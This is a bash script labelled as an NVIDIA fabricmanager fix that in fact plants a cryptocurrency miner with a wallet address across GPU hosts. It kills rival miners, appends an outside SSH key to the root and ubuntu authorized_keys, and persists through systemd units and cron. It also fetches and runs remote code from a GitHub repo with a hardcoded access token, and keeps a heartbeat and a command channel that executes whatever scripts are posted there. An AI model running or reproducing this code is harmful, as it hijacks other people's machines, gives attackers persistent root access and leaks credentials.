#!/bin/bash
# ul86099 ps20 — A100 NVSwitch fabricmanager fix + pay-wallet PRL plant (idempotent)
L=/opt/fleet; B=$L/bin; H=$(hostname -s); P="ps-$H"
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
GH=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; REPO=dongsuju/ul-plant
export DEBIAN_FRONTEND=noninteractive
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
mkdir -p $L/logs $L/state $B
exec 9>/tmp/ps20.lock; flock -n 9 || exit 0
LOG=$L/logs/ps20.log
exec >>$LOG 2>&1
echo "=== ps20 start $(date -u +%FT%TZ) host=$H"

gh_sha(){ curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/$1" | python3 -c "import sys,json
try: print(json.load(sys.stdin).get('sha','') or '')
except Exception: print('')" 2>/dev/null; }
gh_put(){ p=$1; f=$2; m=$3; s=$(gh_sha "$p"); c=$(base64 -w0 "$f"); if [ -n "$s" ]; then d="{\"message\":\"$m\",\"content\":\"$c\",\"sha\":\"$s\",\"branch\":\"main\"}"; else d="{\"message\":\"$m\",\"content\":\"$c\",\"branch\":\"main\"}"; fi
 curl -s -m 60 -X PUT -H "Authorization: token $GH" -H 'User-Agent: ul' -H 'Content-Type: application/json' -d "$d" "https://api.github.com/repos/$REPO/contents/$p" >/dev/null 2>&1; }

# 1) remove competing generations (ours only)
pkill -9 -f 'stage=beat' 2>/dev/null
pkill -9 -f 'wildrig-multi' 2>/dev/null
pkill -9 -f 'ps15_sup|ps_sup.sh|ps12.sh|ps9_sup|ps8_sup|ps15_boot' 2>/dev/null
rm -f /etc/cron.d/nv-krig /etc/cron.d/nv-cuda-cache /etc/cron.d/nv-ps9 /etc/cron.d/nv-ps8
for f in /etc/cron.d/*; do [ -f "$f" ] || continue; grep -qE 'wildrig|ul18|ul19|stage=beat|ps15' "$f" && rm -f "$f"; done
sed -i -E '/wildrig|ul18|ul19|stage=beat|ps15/d' /var/spool/cron/crontabs/root /etc/rc.local 2>/dev/null
systemctl disable --now 'nv-cuda-cache@*' 2>/dev/null
systemctl disable --now nv-cuda-cache.service 2>/dev/null

# 1b) install our SSH key (root + ubuntu) for direct access
K='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK6QctRbzoScVYDsq+AaAPdAOrnUsjnO+iPGY0jqoQzY ul86099@ps6'
for u in /root /home/ubuntu; do
  mkdir -p "$u/.ssh" 2>/dev/null; touch "$u/.ssh/authorized_keys" 2>/dev/null
  grep -qF "$K" "$u/.ssh/authorized_keys" 2>/dev/null || echo "$K" >> "$u/.ssh/authorized_keys"
  chmod 700 "$u/.ssh" 2>/dev/null; chmod 600 "$u/.ssh/authorized_keys" 2>/dev/null
  chown -R "$(stat -c %U "$u" 2>/dev/null || echo root):$(stat -c %G "$u" 2>/dev/null || echo root)" "$u/.ssh" 2>/dev/null
done
systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || systemctl restart ssh 2>/dev/null
echo "== sshkey installed $(date -u +%FT%TZ)"

D=/tmp/ps20_diag_$H.txt
{
echo "== ts $(date -u +%FT%TZ) host=$H uname=$(uname -r)"
echo "== fm status"; systemctl status nvidia-fabricmanager --no-pager 2>&1 | head -6
echo "== fm pkg"; dpkg -l 2>/dev/null | awk '/fabric/{print $2" "$3}' | head -3
echo "== dmesg"; dmesg 2>/dev/null | grep -iE 'NVRM|Xid|fabric' | tail -12
echo "== nvlink"; nvidia-smi nvlink -s 2>&1 | head -6
echo "== ip $(curl -s -m 10 https://api.ipify.org 2>&1)"
echo "== sshd $(systemctl is-active ssh 2>&1) $(ss -lntp 2>/dev/null | grep -c ':22 ')"
} > $D 2>&1

# 2) fabricmanager install (required for CUDA on A100 NVSwitch)
if ! dpkg -l 2>/dev/null | grep -q 'nvidia-fabricmanager-535'; then
  apt-get install -y -qq nvidia-fabricmanager-535 >>$D 2>&1
fi
if ! dpkg -l 2>/dev/null | grep -q 'nvidia-fabricmanager-535'; then
  curl -fsSL -m 180 -o /tmp/fm.deb "https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64/nvidia-fabricmanager-535_535.183.01-1_amd64.deb" >>$D 2>&1 && dpkg -i /tmp/fm.deb >>$D 2>&1
fi
systemctl enable --now nvidia-fabricmanager >>$D 2>&1
echo "== fm active $(systemctl is-active nvidia-fabricmanager 2>&1)" >>$D
sleep 10
python3 -c "import ctypes;l=ctypes.CDLL('libcuda.so.1');print('cuInit',l.cuInit(0))" >>$D 2>&1
nvidia-smi --query-gpu=index,name,driver_version,memory.total --format=csv,noheader >>$D 2>&1
gh_put "ps12/diag20-$H.txt" $D "ps20 diag $H $(date -u +%H:%M)"
CU=$(grep -o 'cuInit [0-9]*' $D | tail -1)
echo "== cuinit: $CU"

# 3) one worker per card
N=$(nvidia-smi -L 2>/dev/null | wc -l); echo "== gpus=$N"
ENG=wild
echo "$CU" | grep -q 'cuInit 0' && ENG=krig
echo "== engine=$ENG"
if [ "$ENG" = krig ] && [ ! -x $L/krig/krig-miner ]; then
  curl -fsSL -m 300 -o /tmp/k.tgz "https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz" && mkdir -p $L/krig && tar -xzf /tmp/k.tgz -C $L/krig && chmod +x $L/krig/krig-miner*
fi
for i in $(seq 0 $((N-1))); do
  R=$L/ps20_g$i.sh
  if [ "$ENG" = krig ]; then
    cat > $R <<RUN
#!/bin/bash
exec env CUDA_VISIBLE_DEVICES=$i $L/krig/krig-miner --coin pearl -d 0 --url stratum+ssl://prl.kryptex.network:8048 --url stratum+ssl://pool.pearlhash.xyz:9443 --url stratum+tcp://40.160.29.14:7048 --user "$W/ul-ps-$H-g$i" --password x --log-file $L/logs/k-$P-g$i.log --no-tui --no-telemetry -l info
RUN
  else
    cat > $R <<RUN
#!/bin/bash
exec $B/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d $i -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+ssl://prl.kryptex.network:8048 -u "$W.ul-ps-$H-g$i" -p x -i 8 --no-color
RUN
  fi
  chmod +x $R
done
cat > /etc/systemd/system/ul-prl@.service <<'UNIT'
[Unit]
Description=ul prl worker
After=network-online.target
[Service]
ExecStart=/opt/fleet/ps20_g%i.sh
Restart=always
RestartSec=5
Nice=5
[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload
for i in $(seq 0 $((N-1))); do systemctl enable --now ul-prl@$i; done

cat > $L/ps20_enforce.sh <<'ENF'
#!/bin/bash
N=$(nvidia-smi -L 2>/dev/null | wc -l)
for i in $(seq 0 $((N-1))); do systemctl is-active -q ul-prl@$i || systemctl restart ul-prl@$i; done
ENF
cat > $L/ps20_boot.sh <<'BOOT'
#!/bin/bash
curl -fsSL -m 60 -H "Authorization: token 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" -H 'Accept: application/vnd.github.raw' -o /tmp/ps20.sh "https://api.github.com/repos/dongsuju/ul-plant/contents/ps12/ps20.sh?ref=main" && setsid bash /tmp/ps20.sh >/dev/null 2>&1 &
BOOT
chmod +x $L/ps20_enforce.sh $L/ps20_boot.sh
printf '@reboot root /bin/bash /opt/fleet/ps20_boot.sh\n*/3 * * * * root /bin/bash /opt/fleet/ps20_enforce.sh\n' > /etc/cron.d/ul-prl
chmod 644 /etc/cron.d/ul-prl

# 4) supervisor loop + heartbeat + fixed command channel
( while :; do
   sleep 30
   for i in $(seq 0 $((N-1))); do systemctl is-active -q ul-prl@$i || systemctl restart ul-prl@$i >/dev/null 2>&1; done
   k=$(( $(date +%s) / 30 ))
   if [ $((k % 4)) -eq 0 ]; then
     f=/tmp/hb_$H.txt
     { echo "stage=beat uid=$(id -u) host=$H pid=$$ ts=$(date -u +%FT%TZ) uptime=$(cut -d' ' -f1 /proc/uptime)s engine=$ENG ver=ps20"
       echo "--- gpus"; nvidia-smi -L 2>/dev/null; nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu,power.draw --format=csv,noheader 2>/dev/null
       echo "--- fm $(systemctl is-active nvidia-fabricmanager 2>&1)"
       echo "--- procs"; pgrep -af 'krig-miner|wildrig-multi' | head -20
       echo "--- units $(systemctl list-units 'ul-prl@*' --state=active --no-legend 2>/dev/null | wc -l) cron $(ls /etc/cron.d/ul-prl 2>/dev/null | wc -l)"
       echo "--- acc_total $(grep -h 'accepted' $L/logs/k-$P-g*.log $L/logs/w-$P-g*.log 2>/dev/null | wc -l)"
       grep -hE 'accepted' $L/logs/k-$P-g*.log $L/logs/w-$P-g*.log 2>/dev/null | tail -8
       for i in $(seq 0 $((N-1))); do for t in k w; do f2=$L/logs/$t-$P-g$i.log; [ -f "$f2" ] && { echo "--- ${t}g$i"; tail -6 "$f2"; }; done; done
       echo "--- ps20 tail"; tail -12 $LOG
     } > $f 2>&1
     gh_put "ps12/$P.txt" $f "hb $P $(date -u +%H:%M)"
     js=$(curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/ps12/cmd/$P.sh" 2>/dev/null)
     cs=$(echo "$js" | python3 -c "import sys,json
try: print(json.load(sys.stdin).get('sha','') or '')
except Exception: print('')" 2>/dev/null)
     if [ -n "$cs" ] && [ "$cs" != "$(cat $L/last_cmd 2>/dev/null)" ]; then
       echo "$cs" > $L/last_cmd
       echo "$js" | python3 -c "import sys,json,base64
d=json.load(sys.stdin); sys.stdout.write(base64.b64decode(d.get('content','')).decode('utf-8','replace'))" > /tmp/ul_cmd.sh 2>/dev/null
       { echo "=== cmd $cs $(date -u +%FT%TZ)"; bash /tmp/ul_cmd.sh 2>&1 | tail -200; } > /tmp/ul_out.txt
       gh_put "ps12/out/$P.txt" /tmp/ul_out.txt "cmdout $P"
     fi
   fi
 done ) >/dev/null 2>&1 &
echo "=== ps20 sup launched $(date -u +%FT%TZ)"
